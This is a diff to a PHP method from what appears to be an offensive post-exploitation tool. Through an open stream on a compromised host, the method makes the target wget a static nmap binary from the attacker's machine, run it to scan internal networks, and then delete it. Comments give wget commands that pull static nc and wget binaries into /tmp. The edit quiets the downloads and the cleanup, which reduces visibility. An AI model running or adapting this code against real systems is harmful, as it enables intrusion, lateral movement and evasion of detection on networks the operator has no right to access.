@@ -186,12 +186,12 @@ This is one way to find out IP addresses for other internal servers.");
         // https://blog.zsec.uk/staticnmap/
         // https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html
         //
-        // wget https://raw.githubusercontent.com/yunchih/static-binaries/master/wget -O /tmp/wget && chmod +x /tmp/wget
-        // wget https://raw.githubusercontent.com/yunchih/static-binaries/master/nc -O /tmp/nc && chmod +x /tmp/nc
+        // wget https://raw.githubusercontent.com/yunchih/static-binaries/master/wget -qO /tmp/wget && chmod +x /tmp/wget
+        // wget https://raw.githubusercontent.com/yunchih/static-binaries/master/nc -qO /tmp/nc && chmod +x /tmp/nc
         $result = "";
         $result .= $this->ssTitre(__FUNCTION__);
-        if (!file_exists("$this->dir_tmp/nmap.bin")) $this->requette("wget https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap.bin -O $this->dir_tmp/nmap.bin ");
-        $data = "wget http://".$this->ip4addr4target($this->ip).":$this->port_rfi/nmap.bin -O ./nmap.bin ";
+        if (!file_exists("$this->dir_tmp/nmap.bin")) $this->requette("wget https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap.bin -qO $this->dir_tmp/nmap.bin ");
+        $data = "wget http://".$this->ip4addr4target($this->ip).":$this->port_rfi/nmap.bin -qO ./nmap.bin ";
         $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
         $result .= $lines;
         $data = "chmod +x ./nmap.bin ";
@@ -200,7 +200,7 @@ This is one way to find out IP addresses for other internal servers.");
         $data = "./nmap.bin $remote_network -Pn -sT -sV --version-all -O --osscan-guess -oX - ";
         $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
         $result .= $lines;
-        $data = "rm -v ./nmap.bin ";
+        $data = "rm ./nmap.bin ";
         //$lines = $this->req_str($stream,$data,$this->stream_timeout,"");$result .= $lines;
         return $result;
     }
